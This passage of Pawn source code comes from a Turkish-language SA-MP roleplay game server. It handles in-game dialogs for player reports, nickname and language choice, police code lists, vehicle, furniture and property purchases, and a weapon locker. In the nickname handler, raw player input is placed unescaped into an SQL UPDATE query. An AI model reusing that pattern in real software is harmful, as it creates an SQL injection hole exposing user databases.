	        ShowPlayerDialog(playerid, 290, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Rapor", mstring, "Ýþlem Yap", "Ýþlem Kapat");
	    }
	    return 1;
	}
	if(dialogid == 290)
	{
		if(response)
		{
		    new mstring[256];
		    new i = GetPVarInt(playerid, "RaporCevapla");
      		format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,Karakter[i][RaporMesaj]);
		    ShowPlayerDialog(playerid, 291, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Rapor", mstring, "Cevapla", "Sil");
		}
	    return 1;
	}
	if(dialogid == 291)
	{
	    if(response)
	    {
	        new pid = GetPVarInt(playerid, "RaporCevapla");
            SendClientMessageEx(playerid, -1, "{c76400}[RAPOR] "C1"%s(%d) oyuncunun raporunu cevapladýnýz.",OyuncuAdiniBul(pid),pid);
		    SendClientMessageEx(pid, -1, "{c76400}[RAPOR] "C1"%s raporunuzu cevapladý.", OyuncuAdiniBul(playerid));
		    SendClientMessageEx(pid, -1, "{c76400}[CEVAP] "C1"%s", inputtext);
		    Karakter[pid][Rapor] = 0;
		    format(Karakter[pid][RaporMesaj], 256, "");
		    format(Karakter[playerid][RaporTarih], 64, "");
		    DeletePVar(playerid, "RaporCevapla");
		    new query[128];
	        format(query,sizeof(query),"UPDATE `karakterler` SET crapor = crapor+1 WHERE `id` = %d",Karakter[playerid][sqlid]);
		    mysql_tquery(1,query);
	    }
	    else
	    {
	        new pid = GetPVarInt(playerid, "RaporCevapla");
	        SendClientMessageEx(playerid, -1, "{c76400}[RAPOR] "C1"%s(%d) oyuncunun raporunu sildiniz.",OyuncuAdiniBul(pid), pid);
	        Karakter[pid][Rapor] = 0;
	        format(Karakter[pid][RaporMesaj], 256, "");
	        DeletePVar(playerid, "RaporCevapla");
	        new query[128];
	        format(query,sizeof(query),"UPDATE `karakterler` SET srapor = srapor+1 WHERE `id` = %d",Karakter[playerid][sqlid]);
		    mysql_tquery(1,query);
	        //SendClientMessageEx(pid, -1, ""C2"[RAPOR] %s raporunuzu sildi.", mstring);
	    }
	}
	if(dialogid == 292)
	{
	    if(response)
	    {
	        new _osay=0, mstring[256];
	        for(new i;i<MAX_PLAYERS;i++)
	        {
	            if(Karakter[i][Soru] == 1)
	            {
		            _osay++;
		            if(_osay == listitem+1)
		            {
				        format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,Karakter[i][SoruMesaj]);
				        SetPVarInt(playerid, "SoruCevapla", i);
				        break;
					}
				}
			}
	        ShowPlayerDialog(playerid, 293, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Soru", mstring, "Ýþlem Yap", "Ýþlem Kapat");
	    }
	    return 1;
	}
	if(dialogid == 293)
	{
		if(response)
		{
			new i = GetPVarInt(playerid, "SoruCevapla");
		    if(gTIslemde[i]) return Hata(playerid, "Bu soru baþka bir helper tarafýndan iþlem görüyor.");
		    new mstring[256];
      		format(mstring, sizeof(mstring), ""C2"%s["C1"%d"C2"]\n"C2"( "C1"%s "C2")",OyuncuAdiniBul(i),i,Karakter[i][SoruMesaj]);
		    ShowPlayerDialog(playerid, 294, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Soru", mstring, "Cevapla", "Sil");
		    gTIslemde[i] = true;
		}
	    return 1;
	}
	if(dialogid == 294)
	{
	    if(response)
	    {
	        new pid = GetPVarInt(playerid, "SoruCevapla");
            SendClientMessageEx(playerid, -1, "{c76400}[SORU] "C1"%s(%d) oyuncunun sorusunu cevapladýnýz.",OyuncuAdiniBul(pid),pid);
		    SendClientMessageEx(pid, -1, "{c76400}[SORU] "C1"%s sorunuzu cevapladý.", OyuncuAdiniBul(playerid));
		    SendClientMessageEx(pid, -1, "{c76400}[CEVAP] "C1"%s", inputtext);
		    Karakter[pid][Soru] = 0;
		    format(Karakter[pid][SoruMesaj], 256, "");
		    DeletePVar(playerid, "SoruCevapla");
		    gTIslemde[pid] = false;
		    new query[128];
		    format(query,sizeof(query),"UPDATE `karakterler` SET csoru = csoru+1 WHERE `id` = %d",Karakter[playerid][sqlid]);
		    mysql_tquery(1,query);
	    }
	    else
	    {
	        new pid = GetPVarInt(playerid, "SoruCevapla");
	        SendClientMessageEx(playerid, -1, "{c76400}[SORU] "C1"%s(%d) oyuncunun sorusunu sildiniz.",OyuncuAdiniBul(pid), pid);
	        Karakter[pid][Soru] = 0;
	        format(Karakter[pid][SoruMesaj], 256, "");
	        DeletePVar(playerid, "SoruCevapla");
	        gTIslemde[pid] = false;
	        new query[128];
	        format(query,sizeof(query),"UPDATE `karakterler` SET ssoru = ssoru+1 WHERE `id` = %d",Karakter[playerid][sqlid]);
		    mysql_tquery(1,query);
	        //SendClientMessageEx(pid, -1, ""C2"[RAPOR] %s raporunuzu sildi.", mstring);
	    }
	}
	if(dialogid == 295)
	{
	    if(response)
	    {
	        if(strlen(inputtext) > 32) return ShowPlayerDialog(playerid, 295, DIALOG_STYLE_INPUT, "Nick Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen nickinizi girin.\n[!]Nickiniz bu kadar uzun olamaz.", "Seçim", "");
	        if(!NickKontrol(inputtext)) return ShowPlayerDialog(playerid, 295, DIALOG_STYLE_INPUT, "Nick Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen nickinizi girin.\n[!]Bu nick kullanýlmaktadýr.", "Seçim", "");
	        format(Karakter[playerid][nick], 32, "%s", inputtext);
			new mstring[70];
			format(mstring, sizeof(mstring), "Nickiniz %s olarak belirlendi.",inputtext);
			Bilgi(playerid, mstring);
			new query[128];
			format(query, sizeof(query), "UPDATE `karakterler` SET `Nickname` = '%s' WHERE `id` = '%d'", inputtext, Karakter[playerid][sqlid]);
			mysql_tquery(1,query);
			if(!DilKontrolEx(playerid)) return ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
	    }
	    return 1;
	}
	if(dialogid == 296)
	{
	    if(response)
		{
		    new _ttext[12];
		    switch(listitem)
		    {
		        case 0:
		        {
		            Karakter[playerid][yem] = 1;
					_ttext = "karides";
		        }
		        case 1:
		        {
		            Karakter[playerid][yem] = 2;
					_ttext = "kurt";
		        }
		        case 2:
		        {
		            Karakter[playerid][yem] = 3;
					_ttext = "ekmek";
		        }
		    }
			new mstring[128];
			format(mstring, sizeof(mstring), "Yeminizi %s olarak deðiþtirdiniz.", _ttext);
			Bilgi(playerid, mstring);
		}
		return 1;
	}
	if(dialogid == 297)
	{
	    if(response)
	    {
	    }
	    return 1;
	}
	if(dialogid == 298)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
					new mstring[1024];
	                strcat(mstring, "10-1\t\t Mesai Baþlangýç\n");
					strcat(mstring, "10-2\t\t Mesai Bitiþi\n");
					strcat(mstring, "10-2a\t\t Mesai Bitiþi\n");
					strcat(mstring, "10-3\t\t Devriye Baþlangýcý\n");
					strcat(mstring, "10-4\t\t Devriye Bitiþi\n");
					strcat(mstring, "10-5\t\t Anlaþýldý\n");
					strcat(mstring, "10-6\t\t Anlaþýlmadý, lütfen daha anlaþýlýr bir þekilde tekrarlayýn\n");
					strcat(mstring, "10-7\t\t Dinlemedeyim, konuþmaya devam edin\n");
					strcat(mstring, "10-8\t\t Rapor Verin\n");
					strcat(mstring, "10-9\t\t Rapor Veriyorum\n");
					strcat(mstring, "10-10\t\t Departmana Dönüyorum\n");
					strcat(mstring, "10-11\t\t Departmandayým\n");
					strcat(mstring, "10-12x\t\t Son Anons Ýptal\n");
					strcat(mstring, "10-13\t\t Trafik Çevirmesindeyiz\n");
					strcat(mstring, "10-13-HIGH\t Yüksek riskli trafik çevirmesindeyiz\n");
					strcat(mstring, "10-15\t\t Araç Bilgilerini Kontrol edin\n");
					strcat(mstring, "10-16\t\t Aranma Kaydýný Kontrol Edin\n");
					strcat(mstring, "10-17\t\t [Bölge] ye doðru gidiyoruz\n");
					strcat(mstring, "10-18\t\t Bölgeye Ýntikal Edildi\n");
					strcat(mstring, "10-19\t\t Þu bölgedeyiz\n");
					strcat(mstring, "10-20\t\t Agresif takipteyim, destek istiyorum\n");
					strcat(mstring, "10-21\t\t Hattaki bütün birimler 10-8 ve 10-10\n");
					strcat(mstring, "10-70\t\t EMT desteði Gerekiyor\n");
					strcat(mstring, "10-71\t\t Hava Desteði Gerekiyor\n");
					strcat(mstring, "10-72\t\t Devriye Desteði Gerekiyor\n");
					strcat(mstring, "10-73\t\t SWAT desteði gerekiyor\n");
					strcat(mstring, "10-74\t\t Dedektif desteði gerekiyor\n");
					strcat(mstring, "10-76\t\t [Bölge]ye çekici talep ediyoruz\n");
					strcat(mstring, "10-77\t\t Þüphelinin tanýmýný yapýn");
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Genel Kodlar", mstring, "Çýkýþ", "");
	            }
	            case 1:
				{
				    new mstring[512];
				    strcat(mstring, "---\t\t Sýk Kullanýlan Vaka Kodlarý\n");
					strcat(mstring, "101\t\t Saldýrý\n");
					strcat(mstring, "108\t\t Cinayet\n");
					strcat(mstring, "202\t\t Hýrsýzlýk\n");
					strcat(mstring, "203\t\t Gasp\n");
					strcat(mstring, "206\t\t Soygun\n");
					strcat(mstring, "501\t\t Huzursuzluk Çýkarmak\n");
					strcat(mstring, "603\t\t Yasa Dýþý Madde Bulundurma\n");
					strcat(mstring, "604\t\t Yasa Dýþý Madde Etkisinde Olmak\n");
					strcat(mstring, "801\t\t Motorlu Bir Araçtan Ateþ Etmek\n");
					strcat(mstring, "802\t\t Kamusal Alanda Silah Çýkarmak\n");
					strcat(mstring, "803\t\t Cezalý Ehliyetle Araç Kullanýmý\n");
					strcat(mstring, "804\t\t Görevli Memurdan Kaçmak\n");
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Vaka Kodlarý", mstring, "Çýkýþ", "");
				}
				case 2:
				{
				    new mstring[512];
				    strcat(mstring, "Kod 0\t\t Memur Vuruldu\n");
					strcat(mstring, "Kod 1\t\t Destek talebini ''rutin'' bir þekilde yanýtlayýn/yanýtlýyoruz\n");
					strcat(mstring, "Kod 2\t\t Destek talebini ''hýzlý'' bir þekilde yanýtlayýn/yanýtlýyoruz\n");
					strcat(mstring, "Kod 3\t\t Destek talebini ''acil'' bir þekilde yanýtlayýn/yanýtlýyoruz\n");
					strcat(mstring, "Kod 4\t\t Destek ekip yeterlidir\n");
					strcat(mstring, "Kod 5\t\t Resmi birimler bölgeden ayrýlýn\n");
					strcat(mstring, "Kod 6\t\t Araç dýþýndayýz\n");
					strcat(mstring, "Kod 6H\t\t Araç dýþýndayýz, destek ekip gerekebilir\n");
					strcat(mstring, "Kod 7\t\t Kiþisel ihtiyaçlar için araç dýþýndayýz\n");
					strcat(mstring, "Kod 12\t\t Yanlýþ alarm/Asýlsýz ihbar");
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Durum Kodlarý", mstring, "Çýkýþ", "");
				}
				case 3:
				{
				    new mstring[600];
				    strcat(mstring, "ADAM (A)\t\t Çift Devriye (Devriye Birimi)\n");
					strcat(mstring, "LINCOLN (L)\t\t Tek Devriye (Devriye Birimi)\n");
					strcat(mstring, "TOM (T)\t\t Çift Devriye (Trafik Birimi)\n");
					strcat(mstring, "TOM LINCOLN (TL)\t Tek Devriye (Trafik Birimi)\n");
					strcat(mstring, "HELI (H)\t\t Çift Devriye (Hava Birimi)\n");
					strcat(mstring, "HELI LINCOLN (HL)\t Tek Devriye (Hava Birimi)\n");
					strcat(mstring, "MARY (M)\t\t Motosiklet Devriyesi\n");
					strcat(mstring, "DAVID (D)\t\t SWAT Devriyesi\n");
					strcat(mstring, "WILLIAM (W)\t\t Dedektif Devriyesi\n");
					strcat(mstring, "EDWARD (E)\t\t Yüksek Hýzlý Araç Devriyesi\n");
					strcat(mstring, "FRANK (F)\t\t Yaya Devriye\n");
					strcat(mstring, "FRANK (K9)\t\t K9 Devriye\n");
					strcat(mstring, "QUEEN (Q)\t\t Özel yetkili ve görev tanýmlamasý olmayan devriye\n");
					strcat(mstring, "TIGER (TG)\t\t Suç Bastýrma Ünitesi");
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Birim Kodlarý", mstring, "Çýkýþ", "");
				}
				case 4:
				{
				    new mstring[512];
					strcat(mstring, "1001\t\t Kask Ýhlali\n");
					strcat(mstring, "1002\t\t Hýz Ýhlali\n");
					strcat(mstring, "1003\t\t Trafik Kontrol Noktalarýna Uymamak\n");
					strcat(mstring, "1004\t\t Park Kurallarýna Uymamak\n");
					strcat(mstring, "1005\t\t Tehlikeli Sürüþ\n");
					strcat(mstring, "1006\t\t Geçiþ Hakký Ýhlalleri\n");
					strcat(mstring, "1007\t\t Seyir Halinde Telefonla Konuþmak\n");
					strcat(mstring, "1008\t\t Özel Mülke Ýzinsiz Park\n");
					strcat(mstring, "1009\t\t Alkollü Araç Kullanmak\n");
					strcat(mstring, "1010\t\t NOS Bulundurmak\n");
					strcat(mstring, "1011\t\t Sokak Yarýþlarý\n");
					strcat(mstring, "1012\t\t Ehliyetsiz Araç Sürmek");
					ShowPlayerDialog(playerid, 297, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Trafik Kanunlarý", mstring, "Çýkýþ", "");
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 299)
	{
	    if(response)
	    {
	        ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
			Karakter[playerid][dil] = listitem+1;
			if(listitem == 16) Karakter[playerid][dil] = 0;
			new mstring[128];
			format(mstring, sizeof(mstring), "Ana dilinizi olarak %s seçtiniz.",DilName(playerid));
			Bilgi(playerid, mstring);
	    	KarakterKaydet(playerid);
	    	if(!Karakter[playerid][boy])
			{
			    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
			}
			else if(!Karakter[playerid][kilo])
			{
			    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
			}
			else if(!Karakter[playerid][gozrenk])
			{
			    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
			}
			else if(!Karakter[playerid][sacrenk])
			{
			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
		else return ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
		return 1;
	}
	if(dialogid == 300)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0:
	            {
	                dilkullaniyor[playerid] = false;
	                Bilgi(playerid, "Kullandýðýnýz dili Ýngilizce olarak deðiþtirdiniz.");
	            }
	            case 1:
	            {
	                dilkullaniyor[playerid] = true;
	                new mstring[128];
	                format(mstring, sizeof(mstring), "Kullandýðýnýz dili %s olarak deðiþtirdiniz.", DilName(playerid));
	                Bilgi(playerid, mstring);
	            }
	        }
	    }
	    return 1;
	}
	if(dialogid == 301)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
	            case 0: SectigiArac[playerid] = 579;
	            case 1: SectigiArac[playerid] = 411;
	            case 2: SectigiArac[playerid] = 451;
	            case 3: SectigiArac[playerid] = 429;
	            case 4: SectigiArac[playerid] = 541;
	            case 5: SectigiArac[playerid] = 545;
	            case 6: SectigiArac[playerid] = 522;
	            case 7: SectigiArac[playerid] = 415;
	            case 8: SectigiArac[playerid] = 586;
	            case 9: SectigiArac[playerid] = 580;
	            case 10: SectigiArac[playerid] = 506;
	            case 11: SectigiArac[playerid] = 409;
	            case 12: SectigiArac[playerid] = 402;
	            case 13: SectigiArac[playerid] = 480;
	            case 14: SectigiArac[playerid] = 477;
	            case 15: SectigiArac[playerid] = 489;
	            case 16: SectigiArac[playerid] = 603;
	            case 17: SectigiArac[playerid] = 560;
	            case 18: SectigiArac[playerid] = 555;
				case 19: SectigiArac[playerid] = 533;
	        }
	        //AracSatinalMenuEx(playerid);
	    }
	    return 1;
	}
	if(dialogid == 302)
	{
		if(response)
		{
			switch(listitem)
			{
		    	case 0: AracRenk1Ex(playerid);//RENK1
			    case 1: AracRenk2Ex(playerid);//RENK2
			    case 2://HIZSABIT
				{
				    if(!IsDoorVehicleEx(SectigiArac[playerid])) return SSAracSatinalMenu(playerid);
					if(SectigiHizSabit[playerid] == 0)
					{
					    SectigiHizSabit[playerid] = 1;
					}
					else if(SectigiHizSabit[playerid] == 1)
					{
					    SectigiHizSabit[playerid] = 0;
					}
					SSAracSatinalMenu(playerid);
				}
				case 3: SSAracSatinalMenu(playerid);//FIYAT
				case 4://ONAYLA
			    {
			    	if(Karakter[playerid][para] >= AldigiAracFiyati[playerid])
			        {
			            new hurdaArac = 0, new_vehicle_sql_id;
						new query[1024];
						for(new i; i < MAX_VEHICLES; i++) {
							if(Arac[i][ahurda] == 1) {
							    new_vehicle_sql_id = i;
								hurdaArac = i;
								LinkVehicleToInterior(i, 0);
								SetVehicleVirtualWorld(i, 0);
								AracModifiyeleriSil(i);
								DestroyVehicle(i);
								break;
							}
						}
						if(!hurdaArac) {
							format(query, sizeof(query), "INSERT INTO `araclar` (`model`) VALUES ('%d')", SectigiArac[playerid]);
				            new Cache:cache = mysql_query(query,true);
				            new_vehicle_sql_id = cache_insert_id();
							cache_delete(cache);
						}
						new vehicleid = CreateVehicle(SectigiArac[playerid], 1927.3710, -2237.1262, 13.5468, 0.0, SectigiAracRenk1[playerid], SectigiAracRenk2[playerid], -1, 0);

						if(IsValidVehicle(vehicleid))
						{
						    Arac[vehicleid][aid] = new_vehicle_sql_id;
						    Arac[vehicleid][amodel] = SectigiArac[playerid];
						    Arac[vehicleid][arenk1] = SectigiAracRenk1[playerid];
						    Arac[vehicleid][arenk2] = SectigiAracRenk2[playerid];
						    Arac[vehicleid][aowner] = Karakter[playerid][sqlid];
						    Arac[vehicleid][aposx] = 1927.3710;
						    Arac[vehicleid][aposy] = -2237.1262;
						    Arac[vehicleid][aposz] = 13.5468;
						    Arac[vehicleid][avworld] = 0;
						    Arac[vehicleid][ainterior] = 0;
						    Arac[vehicleid][afiyat] = AldigiAracFiyati[playerid];
						    Arac[vehicleid][ahasar] = 1000.0;
						    Arac[vehicleid][alights] = 0;
						    Arac[vehicleid][abenzin] = 100.0;
						    Arac[vehicleid][apaintjob] = 99;
						    Arac[vehicleid][aspawn] = 1;
							Arac[vehicleid][akilittip] = 1;
							Arac[vehicleid][aimmo] = 1;
							Arac[vehicleid][aalarm] = 1;
							Arac[vehicleid][atip] = 1;
							Arac[vehicleid][abirlik] = 255;
							Arac[vehicleid][abenzintip] = SectigiYakit[playerid];
							Arac[vehicleid][ahizsabit] = SectigiHizSabit[playerid];
							Arac[vehicleid][vergi] = 0;
							Arac[vehicleid][ahurda] = 0;
							Arac[vehicleid][akm] = 0;
							Arac[vehicleid][ametre] = 0;
							Arac[vehicleid][aisyeri] = 0;
							Arac[vehicleid][agelir] = 0;
							Aractamiri(vehicleid);
							new plakakyd[128];
			        		format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
			        		strmid(Arac[vehicleid][aplaka], plakakyd, 0, strlen(plakakyd), 255);
							AracKaydet(vehicleid);

				 			LinkVehicleToInterior(vehicleid, 0);
							SetVehicleVirtualWorld(vehicleid, 0);
							SetVehicleNumberPlate(vehicleid, Arac[vehicleid][aplaka]);
							SetVehicleToRespawn(vehicleid);
							if(!IsABike(vehicleid)) MotoruKapat(vehicleid);

							GivePlayerCash(playerid, -AldigiAracFiyati[playerid]);
							Bilgi(playerid, "Araç teslimatý baþarýyla gerçekleþti.(Havalimaný - /a liste)");
							new araclogla[110];
							format(araclogla, sizeof(araclogla), "[SUPER SPORT GALERI - /a satinal] Galeriden %d idli araci satin aldi. model: %d fiyat: %d aowner: %d", Arac[vehicleid][aid],Arac[vehicleid][amodel],Arac[vehicleid][afiyat], Arac[vehicleid][aowner]);
							Log(playerid, araclogla);
						}
					}
					else return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
			    }
			}
		}
		return 1;
	}
	if(dialogid == 303)
	{
		if(response)
		{
		    if(GetPlayerCash(playerid) < GetPVarInt(playerid, "MobilyaFiyat")) return Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
		    GivePlayerCash(playerid, -GetPVarInt(playerid, "MobilyaFiyat"));
		    Bilgi(playerid, "Mobilyayý baþarýyla aldýnýz.");
		    new mstring[512];
		    Log(playerid, "Mobilya satin alindi.");
			foreach(new q : Houses)
			{
				if(Ev[q][esahip] == Karakter[playerid][sqlid] || Ev[q][kiralayan] == Karakter[playerid][sqlid] || Karakter[playerid][eanahtar][Ev[q][eid]] == 1)
				{
				    format(mstring, sizeof(mstring), "%sevID:%d\t Adres:%s\n",mstring, q, GetLocation(Ev[q][girisX],Ev[q][girisY],Ev[q][girisZ]));
				}
			}
			Ipucu(playerid, "Mobilyayý hangi eve göndermek istediðinizi seçin.");
			ShowPlayerDialog(playerid, 304, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Gönder", "");
		}
		return 1;
	}
	if(dialogid == 304)
	{
	    if(response)
	    {
	        new id, mstring[128], _say=-1;
	        foreach(new q : Houses)
			{
				if(Ev[q][esahip] == Karakter[playerid][sqlid] || Ev[q][kiralayan] == Karakter[playerid][sqlid] || Karakter[playerid][eanahtar][Ev[q][eid]] == 1)
				{
				    _say++;
				    if(_say == listitem)
				    {
				        id = q;
				        //printf("%d",q);
				        break;
				    }
				}
			}
			format(mstring, sizeof(mstring), "Mobilya %s %d adresine gönderildi.", GetLocation(Ev[id][girisX],Ev[id][girisY],Ev[id][girisZ]),id);
			Bilgi(playerid, mstring);
			new query[128];
			format(query, sizeof(query), "INSERT INTO `mobilya` (`model`, `int`, `vw`) VALUES('%d', '%d', '%d')", GetPVarInt(playerid, "MobilyaModel"), Ev[id][ecikisint], id);
			new Cache:cache = mysql_query(query,true);
			new msqlid = cache_insert_id();
			cache_delete(cache);
			new i;
			for(new idx=0;idx<MAX_MOBILYA;idx++)
			{
			    if(!IsValidDynamicObject(Mobilya[idx][mobje]) && !Mobilya[idx][mint] && !Mobilya[idx][mvw])
			    {
			        i = idx;
			        break;
				}
			}
			Mobilya[i][mid] = msqlid;
			Mobilya[i][mmodel] = GetPVarInt(playerid, "MobilyaModel");
			Mobilya[i][mx] = 0;
			Mobilya[i][my] = 0;
			Mobilya[i][mz] = 0;
			Mobilya[i][mint] = Ev[id][ecikisint];
			Mobilya[i][mvw] = id;
			//
			Mobilya[i][mtexture][0] = 0;
			Mobilya[i][mtexture][1] = 0;
			Mobilya[i][mtexturerenk][0] = -1;
			Mobilya[i][mtexturerenk][1] = -1;
			MobilyaKaydet(i);
	    }
	    return 1;
	}
	if(dialogid == 305)
	{
		if(response)
		{
		    new id, _say=-1;
		    new mesafe = EvIceridenMesafesi(playerid);
            for(new i;i<MAX_MOBILYA;i++)
  			{
	    		if(Mobilya[i][mint] == Ev[mesafe][ecikisint] && Mobilya[i][mvw] == mesafe && Mobilya[i][mx] == 0 && Mobilya[i][my] == 0 && Mobilya[i][mz] == 0)
				{
				    _say++;
				    if(_say == listitem)
				    {
						id = i;
						break;
					}
				}
			}
			new Float:pPos[3];
			GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
			GetXYInFrontOfPlayer(playerid, pPos[0], pPos[1], pPos[2], 1.0);
			printf("%f - %f - %f - %d - %d",Mobilya[id][mx],Mobilya[id][my],Mobilya[id][mz],Mobilya[id][mvw],Mobilya[id][mint]);
			Mobilya[id][mx] = pPos[0];
			Mobilya[id][my] = pPos[1];
			Mobilya[id][mz] = pPos[2];
		    Bilgi(playerid, "Mobilyanýzý düzenleyin.");
			Mobilya[id][mobje] = CreateDynamicObject(Mobilya[id][mmodel], pPos[0], pPos[1], pPos[2], 0, 0, 0, .worldid=Mobilya[id][mvw], .interiorid=Mobilya[id][mint]);
			ObjeKurdu(playerid);
			EditDynamicObject(playerid, Mobilya[id][mobje]);
			mobilyaci3[playerid] = id;
			mobilyaci4[playerid] = 1;
			if(mobilyaci5[playerid] == 1)
			{
				new mstring[64];
	   			format(mstring, sizeof(mstring), "{FFFFFF}Mobilya[{fb5a02}%d{FFFFFF}]",id);
			    Mobilya[id][mlabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Mobilya[id][mx],Mobilya[id][my],Mobilya[id][mz],3.0);
			}
			Streamer_Update(playerid);
		}
		return 1;
	}
	if(dialogid == 306)
	{
	    if(response)
	    {
	        new _efiyat = GetPVarInt(playerid, "EvSatisFiyat");
	        new pid = GetPVarInt(playerid, "EvSatici");
			if(GetPlayerCash(playerid) < _efiyat)
			{
			    Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
			    Hata(pid, "Oyuncunun üzerinde yeterli miktarda para yok.");
			    return 1;
			}
			new id = GetPVarInt(playerid, "EvSatisID");
			if(Ev[id][esahip] != Karakter[pid][sqlid]) return Hata(pid, "Bu iþyeri üzerinize kayýtlý deðil.");
			Bilgi(playerid, "Evi baþarýyla aldýnýz.");
			Bilgi(pid, "Evi baþarýyla sattýnýz.");
			GivePlayerCash(playerid, -_efiyat);
			GivePlayerCash(pid, _efiyat);
			Ev[id][esahip] = Karakter[playerid][sqlid];
            EvAnahtarTumSil(id);
			EvKaydet(id);
			DestroyColouredCheckpoint(Ev[id][ecp]);
			EvAyarla(id);
	    }
	    return 1;
	}
	if(dialogid == 307)
	{
	    if(response)
	    {
	        new _ifiyat = GetPVarInt(playerid, "IsSatisFiyat");
	        new pid = GetPVarInt(playerid, "IsSatici");
			if(GetPlayerCash(playerid) < _ifiyat)
			{
			    Hata(playerid, "Üzerinizde yeterli miktarda para yok.");
			    Hata(pid, "Oyuncunun üzerinde yeterli miktarda para yok.");
			    return 1;
			}
			new id = GetPVarInt(playerid, "IsSatisID");
			if(Isyeri[id][isahip] != Karakter[pid][sqlid]) return Hata(pid, "Bu iþyeri üzerinize kayýtlý deðil.");
			Bilgi(playerid, "Ýþyerini baþarýyla aldýnýz.");
			Bilgi(pid, "Ýþyerini baþarýyla sattýnýz.");
			GivePlayerCash(playerid, -_ifiyat);
			GivePlayerCash(pid, _ifiyat);
			Isyeri[id][isahip] = Karakter[playerid][sqlid];
            Isyeri[id][ortak] = -1;
			IsyeriKaydet(id);
			IsyeriAyarla(id);
	    }
	    return 1;
	}
	if(dialogid == 308)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
				GivePlayerWeapon(playerid, 3, 1);
			}
		    if(listitem == 1)
		    {
				GivePlayerWeapon(playerid, 41, 1500);
				SetPlayerAmmo(playerid, WEAPON_SPRAYCAN, 1500);
			}
		    if(listitem == 2)
		    {
				GivePlayerWeapon(playerid, 24, 100);
				SetPlayerAmmo(playerid, WEAPON_DEAGLE, 100);
			}
		    if(listitem == 3)
		    {
		        GivePlayerWeapon(playerid, 29, 150);
		        SetPlayerAmmo(playerid, WEAPON_MP5, 150);
			}
		    if(listitem == 4)
		    {
		        if(GetPVarInt(playerid, "BeanBag") == 1) return Hata(playerid, "Þuan beanbag kullanýyorsunuz.");
		        GivePlayerWeapon(playerid, 25, 20);
		        SetPlayerAmmo(playerid, WEAPON_SHOTGUN, 20);
			}
		    if(listitem == 5)
		    {
		        GivePlayerWeapon(playerid, 31, 120);
		        SetPlayerAmmo(playerid, WEAPON_M4, 120);
			}
			if(listitem == 6)
			{
			    SetPlayerArmour(playerid, 25);
			    RemovePlayerAttachedObject(playerid, ARMOUR_INDEX);
			}
			if(listitem == 7)
			{
			    SetPlayerArmour(playerid, 100);
			    SetPlayerAttachedObject( playerid, ARMOUR_INDEX, 19142,1,0.065,0.0425,0.0175,0.0,0.0,0.0,1.1,1.1,1.1);
			}
			if(listitem == 8)
			{
			    SetPlayerArmour(playerid, 0);
			    ResetPlayerWeapons(playerid);
			    RemovePlayerAttachedObject(playerid, ARMOUR_INDEX);
			    RemovePlayerAttachedObject(playerid, KASK_INDEX);
			}
		}
		return 1;
	}
	if(dialogid == 800)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
				GivePlayerWeapon(playerid, 6, 1);
